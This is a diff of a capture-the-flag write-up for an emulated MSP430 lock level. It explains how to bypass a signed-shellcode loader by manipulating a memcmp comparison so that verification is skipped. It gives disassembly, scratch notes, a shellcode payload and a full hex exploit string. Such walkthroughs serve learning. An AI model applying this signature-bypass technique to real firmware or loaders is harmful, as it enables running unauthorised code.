@@ -1,23 +1,9 @@
-TODO: check if byte pair orderings need to be swapped
+## Overview
+
+So for this level we can supply a binary shellcode blob, but the shellcode needs to be signed
+and verified before it is executed. The blob has the following format:
 
 ```text
-800000063041c26436953f8f3cadf1442fc218b185051ab6c20853a45f093fc32a
-df31529d05a5ec3e96a9e41ed9ad1b14dcbdb98e50e37a7ddc3d595b867807ed16
-05f2070e
-```
-
-```
-800000063041c26436953f8f3cadf1442fc218b185051ab6c20853a45f093fc32adf31529d05a5ec3e96a9e41ed9ad1b14dcbdb98e50e37a7ddc3d595b867807ed1605f2070e
-```
-
-
-Load address outside allowed range of 0x8000-0xF000
-
-
-
-Example test input:
-8081010662636465666768696A6B6C6D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A00
-
 [0..1][2][3][data]
   |     \  \- byte 4 is some sort of offset byte
   |      byte 3 is verifier type
@@ -27,8 +13,52 @@ Example test input:
 [01] verifier type 1 == sha512, everything else is ed25519
 [04] payload len? 0x06-0xff (underflow and error when < 0x06)
      so it copies everything after that len as the sig to check?
+```
 
-### Len check on payload length/offset byte 
+By default, the verified type is ed25519. But in the code there are three other types of verifiers that can be used. The first is sha512, the second is sha256, and the third is sha1. But reading into the code it becomes clear that only ed25519 and sha512 are actually used. You can toggle between these two types by setting the verifier type byte to 0x01 or 0x00 respectively.
+
+The verifier type is checked in the following psuedo code:
+```c 
+if (verifier_type == 1) {
+    // sha512
+    sha512(user_input+offset, payloadlen, stack_buffer);
+} else if (verifier_type == 0) {
+    // ed25519
+    ed25519_verify(user_input+offset, payloadlen, stack_buffer);
+} else {
+    // error
+}
+```
+
+Byte 4 is an offset byte. It is subtracted by 6, and then checked to see if it is less than 0x3bb. If it is, then it is used as an offset into the user input to extract a "signature" to check. 
+
+The "signature" is copied from the user input to the stack buffer, and then passed to the verifier function the length of this signature is always 0x40 bytes.
+
+By carefully setting the data in the user input and signature, its possible to exploit the memcmp function to exit early, and set the r15 register to 1. This will cause the program to skip the error check, and pop the supplied load address off the stack into r11 and then jump to it.
+
+The load address is checked to be between 0x8000 and 0xF000. If it is not, then the program exits with an error. The tricky? part is massaging the user input and signature so that the memcmp function exits early, and sets r15 to 1, but also so that the load address is valid. Once you get these two things working, you can just supply a shellcode blob, and it will be executed.
+
+### Solution and Exploit
+
+Payload:
+
+```assembly
+;; 80000106000030127f00b0122a45
+8000           swpb	pc
+0106           push	sp
+0000           rrc	pc
+3012 7f00      push	#0x7f
+b012 2a45      call	#0x452a
+```
+
+Full exploit string:
+```text
+f000010e0b9b30127f00b0122a45036D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A
+```
+
+----------------------------------------------------------
+
+### General Scratch/Notes
 
 ```c
 offset = offset - 6; // if < 6 this wraps to ~0xffff
@@ -37,6 +67,7 @@ if (offset >= 0x3bb) {
 }
 ```
 
+```
 // copy the "signature" to check
 memcpy(user_input+payloadlen,stack_buffer,0x40)
 
@@ -44,7 +75,7 @@ memcpy(user_input+payloadlen,stack_buffer,0x40)
 r14 == payloadlen 
 r15 == start of user input (#0x2420)
 call	#0x4566 <sha512>
-
+```
 
 In the call to SHA512, set the syscall id so that it calls sha1 and sha256 instead of sha512
 
@@ -58,12 +89,6 @@ let 43b6 = 30 // sha1
 let 43b8 = 31 // sha256
 let 43ba = 32 // sha512
 let 43ba = 33 // ed25519
-```
-
-```
-```
-
-```
 ```
 
 ```
@@ -87,12 +112,9 @@ printf "\x80\x81\x01\x06\x62\x63" | sha1sum
 
 ```
 
-compare the hashed output, to the user supplied input hash at specified offset 
-with constant 0x40 length
+compare the hashed output, to the user supplied input hash at specified offset with constant 0x40 length
 
-if it all matches, then pop the 8081 off the stack into r11
-but then it checks if r15 is 1, and if it is not, it throws an error
-so inside of the memcmp, we need to exploit this compare:
+if it all matches, then pop the 8081 off the stack into r11 but then it checks if r15 is 1, and if it is not, it throws an error so inside of the memcmp, we need to exploit this compare:
 ```
 4608:  4f4b           mov.b	r11, r15
 460a:  4e4c           mov.b	r12, r14
@@ -101,17 +123,11 @@ so inside of the memcmp, we need to exploit this compare:
 so that r15 == 1
 
 so for example, if the compared byte is 4c then we set the input to 4b.
-```
+
 
 ```
 808101069c9a1cb8afef1eb9a8ca0a95ea154d1063ff545e5270ef3868690c150b4ea55a9c59ae1593c532f21b56e16a21001fadaabafa1a04c224e7b0007b25b015c5a2
 ```
-
-
-hashes N bytes from the start of the user input
-
-
-8081010a62634cf95d6ac044341779df9e8fb37b9b0704b7f97d7a094a066bba44381929743e08e274dafb4cd400093a8cac7554533169df5cb94f6a44d1955cb206bcb936b9
 
 ```
 r13 == copied payload buffer 
@@ -123,7 +139,6 @@ call	#0x4566 <sha512>
 then copies this into the buffer at 8081, and jumps to it to execute it
 
 ```
-
 // set r15 to syscall to open lock
 // jmp to INT 
 
@@ -141,12 +156,10 @@ let pc = ff80
 
 8000016162636465666768696A6B6C6D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A
 
-
-
-
 // the payload
 80000106000030127f00b0122a45
 
+// solution
 f000010e0b9b30127f00b0122a45036D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A
 
 4cf95d6ac044341779df9e8fb37b9b0704b7f97d7a094a066bba44381929743e08e274dafb4cd400093a8cac7554533169df5cb94f6a44d1955cb206bcb936b9
@@ -159,38 +172,33 @@ let f006 = 12b0
 let f008 = 452a
 
 let pc = f000
-
-
-
-
-
-
-
-
-
+```
 
 Read N from byte 4 and add to base:
+```asm
 44aa:  084a           mov	r10, r8
 44ac:  3850 2024      add	#0x2420, r8
+```
 
 Copy 0x40 bytes from base + offset to stack buffer.
 
-```
+```asm
 44c0:  0d41           mov	sp, r13            // output
 44c2:  0e4a           mov	r10, r14           // size? offset? specified by byte 4
 44c4:  3f40 2024      mov	#0x2420, r15       // pointer to input
 44c8:  b012 6645      call	#0x4566 <sha512>
 ```
-makes a sha512 of the full input and saves it to sp 
 
-then compares 
+makes a sha512 of the full input and saves it to sp then compares 
 
+```
 r13 == 0x40 (64, size of a sha512 hash)
 r14 == ?? looks like a pointer to some memory, maybe controlled by the offset on the input?
 r15 == the sha512 hash of the input
-
-// copy 64 bytes of input data, from input + offset, into a buffer
 ```
+
+copy 64 bytes of input data, from input + offset, into a buffer
+```asm
 44cc:  3d40 4000      mov	#0x40, r13      // 64 bytes
 44d0:  0e48           mov	r8, r14         // from base of input + offset 
 44d2:  0f41           mov	sp, r15         // output is buffer on stack
@@ -204,25 +212,20 @@ r15 == the sha512 hash of the input
 245f 0000 0000 0000 0000 0000 0000 0000 0000  ................
 ```
 
-
-
-
-Ideas : 
- 1. null byte in the middle of the input
- 2. maybe memory is not reset between runs, so we can use the previous run to set the hash to something we want
-
-```
+```asm
 44aa:  084a           mov	r10, r8     // 8 is an offset (this is also used later for the sha512)
 44ac:  3850 2024      add	#0x2420, r8 // 2420 is the start of the input
 ```
 
-
+```
 8000010F62636465666768696A6B6C6D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A00
+```
 
-
+```bash
 printf "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x35\x55\x56\x57\x58\x59\x5a\x00" | sha512sum
+```
 
-
+```
 [8000][01][0F]62636465666768696A6B6C6D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A00
 
 [8000]
@@ -230,9 +233,11 @@ printf "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44
 [04] payload len 0x06-0xff (weird behavior when lower)
 
 8000010662636465666768696A6B6C6D6E6F707172737475767778797A4142434445464748494A4B4C4D4E4F505152535455565758595A00
+```
 
-
+```c
 memcpy(user_input+payloadlen,stack_buffer,0x40)
+```
 
 ```
 r13 == copied payload buffer 
@@ -284,5 +289,4 @@ let 44c8 = b0
 let 44c9 = 12
 let 44ca = 42
 let 44cb = 45
-
 ```
